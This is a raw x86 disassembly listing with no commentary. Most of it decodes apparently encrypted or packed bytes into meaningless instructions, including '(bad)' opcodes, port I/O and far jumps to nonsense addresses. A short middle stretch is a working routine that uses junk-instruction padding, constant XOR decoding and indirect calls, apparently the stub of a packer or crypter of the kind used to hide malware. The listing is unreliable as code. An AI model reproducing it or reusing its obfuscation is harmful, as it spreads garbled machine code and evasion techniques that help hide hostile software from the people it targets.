  408bc1:	sbb    ebp,DWORD PTR [edx-0x22af2570]
  408bc7:	and    esi,ecx
  408bc9:	loop   0x408c41
  408bcb:	cmp    BYTE PTR [edi+0x8],ch
  408bce:	in     al,0x40
  408bd0:	hlt    
  408bd1:	jns    0x408c49
  408bd3:	mov    dh,0xa0
  408bd5:	jno    0x408c0e
  408bd7:	test   BYTE PTR [ebx+edx*4],dl
  408bda:	jbe    0x408b80
  408bdc:	sbb    eax,0xb78ecfa4
  408be1:	clc    
  408be2:	ja     0x408ba1
  408be4:	or     BYTE PTR [edx-0x241cf74b],al
  408bea:	xchg   BYTE PTR [eax+esi*4-0x33fb775c],dh
  408bf1:	lahf   
  408bf2:	jnp    0x408c11
  408bf4:	ss dec ebp
  408bf6:	or     eax,0x258d879
  408bfb:	xor    dl,BYTE PTR [ebx-0x4d]
  408bfe:	arpl   bx,cx
  408c00:	lock cwde 
  408c02:	sbb    DWORD PTR [edi],eax
  408c04:	cmc    
  408c05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c06:	mov    edi,0x78a8d843
  408c0b:	addr16 pusha 
  408c0d:	mov    esi,0x56222934
  408c12:	adc    al,0x18
  408c14:	mov    bl,0x93
  408c16:	mov    DWORD PTR [ebx-0x64],esp
  408c19:	and    esi,esp
  408c1b:	hlt    
  408c1c:	push   ss
  408c1d:	fwait
  408c1e:	jle    0x408c50
  408c20:	inc    esi
  408c21:	cs in  eax,0x26
  408c24:	fdivr  DWORD PTR [edi]
  408c26:	push   ds
  408c27:	mov    eax,0x8e9751df
  408c2c:	addr16 inc eax
  408c2e:	mov    ebx,DWORD PTR [edi-0x34]
  408c31:	xor    esi,esi
  408c33:	xor    ebp,DWORD PTR ds:0x2e865dde
  408c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c3a:	cmp    al,0x36
  408c3c:	xchg   DWORD PTR [eax-0x53c06a59],edx
  408c42:	lds    edx,FWORD PTR [esi-0x691731cc]
  408c48:	loopne 0x408cc0
  408c4a:	inc    ecx
  408c4b:	(bad)  
  408c4c:	ret    0xf39e
  408c4f:	into   
  408c50:	add    al,cl
  408c52:	push   edi
  408c53:	outs   dx,DWORD PTR ds:[esi]
  408c54:	adc    eax,0xcc0e62cf
  408c59:	stc    
  408c5a:	aad    0x17
  408c5c:	fwait
  408c5d:	adc    eax,0xfda1e93d
  408c62:	fs addr16 mov edi,0xa6ab849d
  408c69:	test   eax,0x26da3255
  408c6e:	das    
  408c6f:	rcl    DWORD PTR [ebx-0x40cd2be7],1
  408c75:	cmp    al,0xde
  408c77:	cdq    
  408c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c79:	mov    BYTE PTR [esi],bh
  408c7b:	mov    esi,0xcd8b0201
  408c80:	xor    edi,DWORD PTR [edi]
  408c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c83:	lds    edx,FWORD PTR [ecx+0x71]
  408c86:	aas    
  408c87:	fs cli 
  408c89:	test   ecx,ebp
  408c8b:	dec    edi
  408c8c:	cmc    
  408c8d:	int3   
  408c8e:	pusha  
  408c8f:	shr    ebp,1
  408c91:	mov    dl,bl
  408c93:	mov    esp,0xfb2a425e
  408c98:	jnp    0x408c9c
  408c9a:	pop    esi
  408c9b:	xchg   edx,eax
  408c9c:	jle    0x408c96
  408c9e:	dec    eax
  408c9f:	sbb    al,0xaa
  408ca1:	inc    edi
  408ca2:	push   esi
  408ca3:	scas   al,BYTE PTR es:[edi]
  408ca4:	pop    ebp
  408ca5:	sub    DWORD PTR [esi+0x747a9674],eax
  408cab:	lods   al,BYTE PTR ds:[esi]
  408cac:	adc    DWORD PTR ds:0x86a92cf9,eax
  408cb2:	add    al,0x89
  408cb4:	out    0xba,al
  408cb6:	leave  
  408cb7:	stos   DWORD PTR es:[edi],eax
  408cb8:	xchg   ecx,eax
  408cb9:	mov    cl,0x4e
  408cbb:	mov    edi,DWORD PTR [esi+0x35dddeb7]
  408cc1:	test   DWORD PTR [esi+0x67faffa9],ebx
  408cc7:	cld    
  408cc8:	shl    BYTE PTR [esi],0xca
  408ccb:	pop    esp
  408ccc:	ss fs jbe 0x408c95
  408cd0:	leave  
  408cd1:	outs   dx,BYTE PTR ds:[esi]
  408cd2:	jno    0x408d3d
  408cd4:	mov    eax,0x6ce3e199
  408cd9:	retf   
  408cda:	jnp    0x408cc8
  408cdc:	daa    
  408cdd:	jmp    0xf4e4:0x133999ed
  408ce4:	sbb    eax,0xc8362e76
  408ce9:	enter  0xb07c,0xe3
  408ced:	cmp    eax,0xf7647fbe
  408cf2:	push   edx
  408cf3:	(bad)  
  408cf4:	shl    DWORD PTR [edx-0x54d52a51],1
  408cfa:	and    BYTE PTR [ebx+0x7f],dh
  408cfd:	cdq    
  408cfe:	leave  
  408cff:	add    BYTE PTR [eax-0x1],cl
  408d02:	jge    0x408d5c
  408d04:	jne    0x40694b
  408d0a:	mov    eax,esi
  408d0c:	jmp    0x408d16
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ffb1
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0x313327cf
  408e55:	js     0x408e8b
  408e57:	xor    BYTE PTR [edx+0x2b626219],cl
  408e5d:	pop    edi
  408e5e:	bound  esp,QWORD PTR [edx-0x12]
  408e61:	mov    cl,0x47
  408e63:	fidivr DWORD PTR [edx]
  408e65:	mov    DWORD PTR [esi+0x30574a31],ecx
  408e6b:	inc    esp
  408e6c:	mov    esp,DWORD PTR [ebp+0x4c]
  408e6f:	pop    ebx
  408e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e71:	enter  0xb11a,0x22
  408e75:	in     eax,0x40
  408e77:	shl    BYTE PTR [ebx+0x2b],1
  408e7a:	mov    ds:0x27ce63fe,eax
  408e7f:	into   
  408e80:	xchg   ecx,eax
  408e81:	dec    ebx
  408e82:	mov    edx,DWORD PTR [ecx+0xd]
  408e85:	ds je  0x408e9f
  408e88:	fwait
  408e89:	(bad)
  408e8d:	call   0x6a80a557
  408e92:	cli    
  408e93:	push   ds
  408e94:	dec    esi
  408e95:	ret    0x3ff7
  408e98:	sbb    ch,dh
  408e9a:	pop    esp
  408e9b:	xchg   DWORD PTR ds:0x2d9a3d67,ecx
  408ea1:	loop   0x408e55
  408ea3:	enter  0xa13f,0xde
  408ea7:	test   al,0x98
  408ea9:	or     eax,eax
  408eab:	in     eax,0x6d
  408ead:	mov    bl,BYTE PTR [ecx+0x5ef16150]
  408eb3:	dec    esi
  408eb4:	cmp    ebp,DWORD PTR [ecx+0xe]
  408eb7:	fadd   QWORD PTR [edx+0x11]
  408eba:	inc    esi
  408ebb:	cmp    BYTE PTR [edx],0x9
  408ebe:	out    dx,al
  408ebf:	mov    DWORD PTR [eax+0x4b],esp
  408ec2:	fs clc 
  408ec4:	call   0xbbfb:0x2eb0fbd7
  408ecb:	xchg   ebx,eax
  408ecc:	daa    
  408ecd:	ja     0x408ef0
  408ecf:	call   0xee9d82f9
  408ed4:	mov    edx,0x5c537436
  408ed9:	daa    
  408eda:	lods   eax,DWORD PTR ds:[esi]
  408edb:	adc    DWORD PTR [ecx+0x40],0x7e
  408edf:	push   cs
  408ee0:	mov    eax,0xaa22bcb1
  408ee5:	inc    edi
  408ee6:	retf   
  408ee7:	xor    DWORD PTR [ebp+0x7],edx
  408eea:	pushf  
  408eeb:	jmp    0x408f05
  408eed:	mov    ah,0x40
  408eef:	jb     0x408ec8
  408ef1:	stos   BYTE PTR es:[edi],al
  408ef2:	cmp    bl,dh
  408ef4:	arpl   WORD PTR [esi+0x63f44bc7],sp
  408efa:	pop    ss
  408efb:	or     edx,DWORD PTR [edi-0x709ba77f]
  408f01:	xchg   edi,eax
  408f02:	add    al,0xda
  408f04:	jo     0x408eaf
  408f06:	push   ebp
  408f07:	cld    
  408f08:	xor    BYTE PTR [edx-0x41190c02],ch
  408f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f0f:	das    
  408f10:	inc    eax
  408f11:	mov    esp,ebp
  408f13:	xor    ch,BYTE PTR [eax-0x4230c55e]
  408f19:	dec    edx
  408f1a:	dec    ebp
  408f1b:	ror    DWORD PTR [esi],0x53
  408f1e:	mov    ebx,0xd4c691b3
  408f23:	ret    
  408f24:	jp     0x408eb3
  408f26:	test   eax,0xe143638f
  408f2b:	pop    ss
  408f2c:	popa   
  408f2d:	push   eax
  408f2e:	push   es
  408f2f:	mov    DWORD PTR [ecx-0x5830bcca],ebp
  408f35:	(bad)  
  408f36:	xchg   ebx,eax
  408f37:	fiadd  DWORD PTR [esi]
  408f39:	shl    ah,0x56
  408f3c:	test   DWORD PTR [esi],eax
  408f3e:	jae    0x408f92
  408f40:	test   al,0x7e
  408f42:	jo     0x408eed
  408f44:	jg     0x408fa8
  408f46:	push   es
  408f47:	pushf  
  408f48:	(bad)  
  408f49:	mov    ecx,0xdf7d0e1a
  408f4e:	out    0xc3,al
  408f50:	jnp    0x408f73
  408f52:	pop    edi
  408f53:	inc    eax
  408f54:	sbb    ebp,0x4730f864
  408f5a:	xchg   BYTE PTR [eax+0x74723ee7],bh
  408f60:	fcom   DWORD PTR [ebx+0x4957a162]
  408f66:	pop    ebx
  408f67:	fisub  WORD PTR [edi+0x213adb68]
  408f6d:	stos   DWORD PTR es:[edi],eax
  408f6e:	jmp    0x603f:0x10027c63
  408f75:	xchg   ecx,eax
  408f76:	jge    0x408f95
  408f78:	and    al,0xda
  408f7a:	shr    bl,0x2
  408f7d:	stos   DWORD PTR es:[edi],eax
  408f7e:	adc    al,0x51
  408f80:	xor    BYTE PTR [edi],al
  408f82:	xchg   ecx,eax
  408f83:	ds cmp al,0x2c
  408f86:	rcr    BYTE PTR [ebx-0x38],1
  408f89:	enter  0x56bd,0x65
  408f8d:	xchg   ebx,eax
  408f8e:	jmp    0x408f8e
  408f90:	adc    al,0x42
  408f92:	adc    DWORD PTR ds:0x524cbda1,0x3e
  408f99:	jo     0x408fb9
  408f9b:	lods   al,BYTE PTR ds:[esi]
  408f9c:	pop    ebp
  408f9d:	daa    
  408f9e:	push   ebp
  408f9f:	dec    eax
  408fa0:	mov    ecx,0x471db8e1
  408fa5:	int    0x6c
  408fa7:	add    al,bl
  408fa9:	xchg   edi,eax
  408faa:	ins    BYTE PTR es:[edi],dx
  408fab:	inc    eax
  408fac:	outs   dx,DWORD PTR fs:[esi]
  408fae:	dec    ebx
  408faf:	fiadd  DWORD PTR [ecx+0x50659fa4]
  408fb5:	ins    BYTE PTR es:[edi],dx
  408fb6:	std    
  408fb7:	push   ds
  408fb8:	ss je  0x408fd8
  408fbb:	cmp    ch,dl
  408fbd:	mov    es,WORD PTR [edi+0x5d]
  408fc0:	imul   edx,DWORD PTR [ebp+0x4cae10f8],0xb9a717d1
  408fca:	fidiv  WORD PTR [edi+0x58]
  408fcd:	ins    BYTE PTR es:[edi],dx
  408fce:	push   esp
  408fcf:	mov    esp,DWORD PTR [edi*4-0x17d86b8e]
  408fd6:	mov    bl,0x54
  408fd8:	imul   esi,DWORD PTR [eax-0x4d657b5e],0x8b16880c
  408fe2:	adc    dl,dl
  408fe4:	mov    edi,0x1f8a80d0
  408fe9:	add    DWORD PTR [eax+0x6f],edx
  408fec:	pop    esp
  408fed:	scas   eax,DWORD PTR es:[edi]
  408fee:	mov    ds:0xc07adb8f,al
  408ff3:	sbb    ah,BYTE PTR [ecx]
  408ff5:	cwde   
  408ff6:	aad    0xf2
  408ff8:	dec    edi
  408ff9:	push   esp
  408ffa:	shl    DWORD PTR [edi],cl
  408ffc:	test   BYTE PTR [ebx],ch
  408ffe:	inc    ebp
  408fff:	pop    ss
  409000:	mov    esp,0xb42d3d62
  409005:	in     eax,0x2
  409007:	cmp    BYTE PTR [esi],ch
  409009:	sub    DWORD PTR [esi+esi*1],esi
  40900c:	push   eax
  40900d:	push   esp
  40900e:	inc    ecx
  40900f:	mov    ds:0xdc4071c5,eax
  409014:	popf   
  409015:	fimul  WORD PTR [edi]
  409017:	mov    cl,0xe5
  409019:	ins    BYTE PTR es:[edi],dx
  40901a:	aam    0x38
  40901c:	inc    esi
  40901d:	mov    esp,0x1c0ed7fc
  409022:	out    0x98,eax
  409024:	or     ch,al
  409026:	jmp    0x39294926
  40902b:	cmp    DWORD PTR [ebx+0x4f061998],esp
  409031:	add    BYTE PTR fs:[edi-0x4ae5a7b5],bl
  409038:	dec    eax
  409039:	sar    DWORD PTR [edx+0x26],0x53
  40903d:	inc    ecx
  40903e:	jnp    0x409000
  409040:	adc    al,0x42
  409042:	scas   al,BYTE PTR es:[edi]
  409043:	mov    ch,0x9a
  409045:	push   edi
  409046:	cli    
  409047:	sbb    ebx,DWORD PTR [esi]
  409049:	ins    DWORD PTR es:[edi],dx
  40904a:	rcr    eax,0xb3
  40904d:	adc    edi,ebp
  40904f:	ins    DWORD PTR es:[edi],dx
  409050:	das    
  409051:	inc    edx
  409052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409053:	mov    esp,0x142e4c88
  409058:	jnp    0x409002
  40905a:	jmp    ecx
  40905c:	mov    ebp,0x4bb82a9d
  409061:	ret    0xb68c
  409064:	jnp    0x409053
  409066:	mov    BYTE PTR [esi-0x1c639943],ch
  40906c:	jo     0x409031
  40906e:	shl    dl,cl
  409070:	aas    
  409071:	mov    bh,0x95
  409073:	in     eax,dx
  409074:	mov    edi,0xd1c0e8ea
  409079:	stos   BYTE PTR es:[edi],al
  40907a:	mov    ss,WORD PTR [ebx+0x4a158036]
  409080:	fwait
  409081:	sbb    ecx,DWORD PTR ds:0x54c02a8f
  409087:	adc    eax,0xb0204499
  40908c:	mov    gs,ebx
  40908e:	mov    al,BYTE PTR [edx+0x15]
  409091:	xchg   esp,eax
  409092:	pop    edi
  409093:	pushf  
  409094:	shr    BYTE PTR [ecx-0x22],0x3d
  409098:	fucomp st(3)
  40909a:	push   edx
  40909b:	das    
  40909c:	clc    
  40909d:	aaa    
  40909e:	push   0xffffff82
  4090a0:	pop    esp
  4090a1:	pop    ecx
  4090a2:	in     eax,dx
  4090a3:	mov    es,WORD PTR [esp+esi*2+0x3a]
  4090a7:	sbb    al,0x87
  4090a9:	jle    0x4090b0
  4090ab:	test   al,0xd4
  4090ad:	mov    esi,esp
  4090af:	outs   dx,DWORD PTR ds:[esi]
  4090b0:	sbb    al,0x82
  4090b2:	jmp    0x409034
  4090b4:	test   al,0xbb
  4090b6:	hlt    
  4090b7:	jmp    FWORD PTR [esi+0x19]
  4090ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090bb:	pop    esi
  4090bc:	jmp    0x4090ad
  4090be:	(bad)  
  4090bf:	daa    
  4090c0:	mov    ds:0xef26f360,eax
  4090c5:	sbb    eax,edx
  4090c7:	out    dx,eax
  4090c8:	push   ebx
  4090c9:	aaa    
  4090ca:	outs   dx,DWORD PTR ds:[esi]
  4090cb:	jmp    0x40912e
  4090cd:	fistp  WORD PTR [edi]
  4090cf:	mov    ecx,0xbdb5ebb
  4090d4:	test   eax,0xf8288c4
  4090d9:	and    al,0x65
  4090db:	loope  0x4090e3
  4090dd:	xlat   BYTE PTR ds:[ebx]
  4090de:	test   DWORD PTR [edx-0x36],edx
  4090e1:	cmp    ebx,esp
  4090e3:	mov    ch,0x14
  4090e5:	arpl   WORD PTR ds:0x5d6f8e05,si
  4090eb:	cmc    
  4090ec:	push   esi
  4090ed:	test   DWORD PTR [eax],edx
  4090ef:	or     esi,eax
  4090f1:	add    bh,BYTE PTR [edi+0x7f]
  4090f4:	cmp    al,0xcd
  4090f6:	test   bh,bh
  4090f8:	inc    ebp
  4090f9:	xor    BYTE PTR [edi],ah
  4090fb:	pop    eax
  4090fc:	and    ch,BYTE PTR [edi+0x112e44cc]
  409102:	mov    WORD PTR [ecx-0x1a9677f6],gs
  409108:	adc    ecx,DWORD PTR [edi-0x6e5563e8]
  40910e:	push   ss
  40910f:	adc    al,BYTE PTR [esi-0x2b]
  409112:	std    
  409113:	mov    cl,0xa1
  409115:	adc    ch,BYTE PTR [esi]
  409117:	xor    ch,BYTE PTR [eax+0x346555c9]
  40911d:	div    al
  40911f:	adc    BYTE PTR [ebp+0x70],ah
  409122:	rcl    DWORD PTR [eax],1
  409124:	(bad)  
  409125:	cwde   
  409126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409127:	sub    BYTE PTR [ecx-0x1c],0xf5
  40912b:	xor    edi,ebp
  40912d:	ror    DWORD PTR [edi+0x4fe5e232],1
  409133:	add    bl,BYTE PTR [eax]
  409135:	jecxz  0x409141
  409137:	les    esp,FWORD PTR [esi-0x4ea7ab4b]
  40913d:	(bad)  [ebp+0x6715152c]
  409143:	inc    edx
  409144:	and    DWORD PTR [ebx+eiz*8],esp
  409147:	shl    BYTE PTR [edi],1
  409149:	sub    al,0xee
  40914b:	xchg   BYTE PTR [edi],dh
  40914d:	mov    bh,0x8c
  40914f:	les    edx,FWORD PTR [esi-0x35]
  409152:	(bad)  
  409153:	mov    ah,0x20
  409155:	xchg   ecx,eax
  409156:	dec    edx
  409157:	jle    0x40913d
  409159:	hlt    
  40915a:	leave  
  40915b:	pop    esi
  40915c:	aaa    
  40915d:	pop    esp
  40915e:	cmp    eax,0x5d77d32a
  409163:	fimul  WORD PTR [esi]
  409165:	ror    BYTE PTR [eax+0x5f2cb595],1
  40916b:	sbb    al,0xaa
  40916d:	push   ss
  40916e:	mov    ebp,0x5380df0d
  409173:	mov    ah,ah
  409175:	lahf   
  409176:	sbb    ah,BYTE PTR cs:[ebp+0x37b70daf]
  40917d:	lods   eax,DWORD PTR ds:[esi]
  40917e:	sar    ah,1
  409180:	mov    ecx,0xbc523c91
  409185:	call   FWORD PTR [edi+0x19500e3f]
  40918b:	hlt    
  40918c:	mov    es,WORD PTR cs:[edi]
  40918f:	pop    ebx
  409190:	inc    ebx
  409191:	test   al,0x75
  409193:	int    0xf6
  409195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409196:	jb     0x40914c
  409198:	pusha  
  409199:	shr    DWORD PTR [esi+0x13],cl
  40919c:	(bad)  
  40919d:	sub    DWORD PTR [eax+0x40fb3c87],esi
  4091a3:	test   al,0x85
  4091a5:	js     0x409167
  4091a7:	jle    0x4091cb
  4091a9:	push   esp
  4091aa:	push   ecx
  4091ab:	popf   
  4091ac:	xor    eax,0xebe2d755
  4091b1:	mov    edi,0xaa8d0656
  4091b6:	enterw 0xce4a,0xd9
  4091bb:	jnp    0x4091bf
  4091bd:	mov    BYTE PTR gs:[ebp+0x762254ac],cl
  4091c4:	sbb    al,0xe3
  4091c6:	push   eax
  4091c7:	adc    eax,0x5ad2bac7
  4091cc:	fcomp  QWORD PTR [edi+0x6a]
  4091cf:	dec    ebx
  4091d0:	sub    BYTE PTR [eax+0x7ee73755],0xc0
  4091d7:	cmc    
  4091d8:	push   0xffffffe9
  4091da:	repnz xchg ah,bh
  4091dd:	pop    ss
  4091de:	stc    
  4091df:	add    BYTE PTR [ecx-0x6a],0x7b
  4091e3:	out    0xab,al
  4091e5:	aad    0x4b
  4091e7:	je     0x4091a7
  4091e9:	mov    bh,0x10
  4091eb:	xchg   edx,eax
  4091ec:	fdivr  st,st(0)
  4091ee:	sbb    DWORD PTR [edi+edi*2+0x51],eax
  4091f2:	xor    ch,BYTE PTR [ecx-0x39]
  4091f5:	sub    ah,bl
  4091f7:	adc    DWORD PTR [ebp-0x118a8593],edi
  4091fd:	inc    eax
  4091fe:	adc    eax,0x80f93cd3
  409203:	loopne 0x409206
  409205:	test   eax,0xba4867d1
  40920a:	stc    
  40920b:	retf   
  40920c:	xchg   DWORD PTR [edx+0x2c0a1fa2],esp
  409212:	clc    
  409213:	cmp    ch,BYTE PTR [edi+0x1]
  409216:	pushf  
  409217:	lock or BYTE PTR ds:0xa291a69e,0xe8
  40921f:	and    bl,dl
  409221:	sti    
  409222:	(bad)  
  409223:	leave  
  409224:	cwde   
  409225:	scas   al,BYTE PTR es:[edi]
  409226:	jmp    0x40928f
  409228:	fs out dx,al
  40922a:	in     al,dx
  40922b:	mov    edi,0x4b563135
  409230:	iret   
  409231:	or     ch,BYTE PTR [ecx-0x2c7a7221]
  409237:	clc    
  409238:	cmp    DWORD PTR [edi-0x1f70a968],0xffffffaf
  40923f:	and    eax,0x22e272bf
  409244:	cmp    esp,DWORD PTR [eax+0x668fa75c]
  40924a:	push   edi
  40924b:	pop    esi
  40924c:	cs (bad) 
  40924e:	adc    esp,esp
  409250:	mov    bl,0x8b
  409252:	addr16 in ax,dx
  409255:	cmp    DWORD PTR [ebp+0x32],eax
  409258:	nop
  409259:	cmp    eax,0xa4a050c5
  40925e:	xor    DWORD PTR [edx],ebx
  409260:	or     al,0x58
  409262:	cmp    eax,0xc34bc421
  409267:	arpl   WORD PTR [ecx-0x3b],dx
  40926a:	sar    edx,0x73
  40926d:	out    0x11,al
  40926f:	(bad)  
  409270:	push   ebp
  409271:	jo     0x409260
  409273:	xchg   ebx,eax
  409274:	dec    ebp
  409275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409276:	lahf   
  409277:	(bad)  
  409278:	mov    eax,ds:0xd62286bb
  40927d:	xlat   BYTE PTR ds:[ebx]
  40927e:	dec    eax
  40927f:	int3   
  409280:	inc    ebp
  409281:	inc    eax
  409282:	jmp    0x6320:0xe3e54634
  409289:	xor    edi,DWORD PTR [edi]
  40928b:	mov    ecx,0x86fdf06
  409290:	fstp   DWORD PTR [esi]
  409292:	dec    esi
  409293:	push   0x32
  409295:	mov    al,ds:0xa74ea411
  40929a:	adc    al,0x1
  40929c:	ret    
  40929d:	mov    bh,ah
  40929f:	test   BYTE PTR [ebx+0x10],dh
  4092a2:	jmp    0x1edd:0xc10898f2
  4092a9:	cmp    BYTE PTR [eax+0x52],ch
  4092ac:	mov    al,ds:0xbc8c186d
  4092b1:	loop   0x409318
  4092b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092b4:	xor    al,0x42
  4092b6:	jecxz  0x409283
  4092b8:	add    ebx,eax
  4092ba:	mov    ah,0x88
  4092bc:	pop    edi
  4092bd:	add    ebp,eax
  4092bf:	leave  
  4092c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092c1:	mov    esp,fs
  4092c3:	stos   DWORD PTR es:[edi],eax
  4092c4:	fnstcw WORD PTR [ecx]
  4092c6:	pop    eax
  4092c7:	in     eax,0x65
  4092c9:	imul   ecx,DWORD PTR [ebx],0x5898b169
  4092cf:	mov    ah,0x6b
  4092d1:	push   ebp
  4092d2:	inc    edx
  4092d3:	ret    
  4092d4:	sub    esi,ecx
  4092d6:	and    DWORD PTR [ebp-0x6bc47e7c],ecx
  4092dc:	cmp    DWORD PTR [esp+ecx*4+0x43d0f027],eax
  4092e3:	aas    
  4092e4:	shl    DWORD PTR [eax+0x5e8bdce],cl
  4092ea:	(bad)  
  4092eb:	in     eax,dx
  4092ec:	fwait
  4092ed:	sub    al,0xf3
  4092ef:	outs   dx,BYTE PTR ds:[esi]
  4092f0:	test   DWORD PTR [ebx+0x67d4114e],edi
  4092f6:	bound  esp,QWORD PTR [ebx+0x34e3e55c]
  4092fc:	pop    edi
  4092fd:	cmp    al,0x2
  4092ff:	inc    ebx
  409300:	xor    eax,0xbf1fc7d9
  409305:	xor    BYTE PTR [ecx-0x71a09f3e],bl
  40930b:	fs push cs
  40930d:	jmp    0x7112:0x83e3fd62
  409314:	aaa    
  409315:	mov    dl,0xc1
  409317:	and    eax,0x106f9e7e
  40931c:	xchg   BYTE PTR [ecx],al
  40931e:	das    
  40931f:	imul   ebx,DWORD PTR [esi+ebx*4-0x4d],0x2d
  409324:	mov    ecx,0x69a6b67e
  409329:	dec    ebp
  40932a:	into   
  40932b:	int    0x36
  40932d:	es xchg edi,eax
  40932f:	mov    ds:0x49ca8373,al
  409334:	jbe    0x409379
  409336:	xrelease mov DWORD PTR [ecx-0x44],edx
  40933a:	pop    ebx
  40933b:	in     eax,dx
  40933c:	jp     0x409340
  40933e:	xchg   esi,eax
  40933f:	loopne 0x409305
  409341:	test   DWORD PTR [ecx-0x1f],eax
  409344:	mov    ds,WORD PTR [edi+0x68b5bd3a]
  40934a:	cwde   
  40934b:	mov    ecx,0x9406407b
  409350:	adc    BYTE PTR [edx+0x2690bd4f],bh
  409356:	rcr    DWORD PTR [ebx],0xd9
  409359:	xchg   ebx,eax
  40935a:	ret    0xb916
  40935d:	mov    cl,0x49
  40935f:	dec    BYTE PTR [ebx-0x17aef047]
  409365:	shl    DWORD PTR [esi+0x24e1844e],cl
  40936b:	xchg   edx,eax
  40936c:	pop    esi
  40936d:	int    0x9
  40936f:	sub    al,BYTE PTR [eax+0x6c]
  409372:	mov    cl,BYTE PTR [edi-0x79]
  409375:	xor    dl,BYTE PTR [ebp+0x60eeac74]
  40937b:	aad    0xb9
  40937d:	fmul   st,st(5)
  40937f:	push   esp
  409380:	sub    BYTE PTR [esi],0xde
  409383:	fcomp  st(7)
  409385:	dec    eax
  409386:	outs   dx,DWORD PTR ds:[esi]
  409387:	sub    edx,edx
  409389:	mov    ss,WORD PTR [edx]
  40938b:	dec    ebp
  40938c:	jo     0x40938d
  40938e:	cmp    ecx,DWORD PTR [eax]
  409390:	push   0x9bf1d374
  409395:	data16 test al,0x60
  409398:	(bad)  
  409399:	out    dx,al
  40939a:	pop    edi
  40939b:	pop    eax
  40939c:	popa   
  40939d:	loop   0x409347
  40939f:	in     al,0xc8
  4093a1:	repz aam 0xd5
  4093a4:	sub    BYTE PTR [eax],ch
  4093a6:	jl     0x4093e5
  4093a8:	enter  0xf36c,0xed
  4093ac:	(bad)  
  4093ad:	push   eax
  4093ae:	dec    esp
  4093af:	out    0xcd,eax
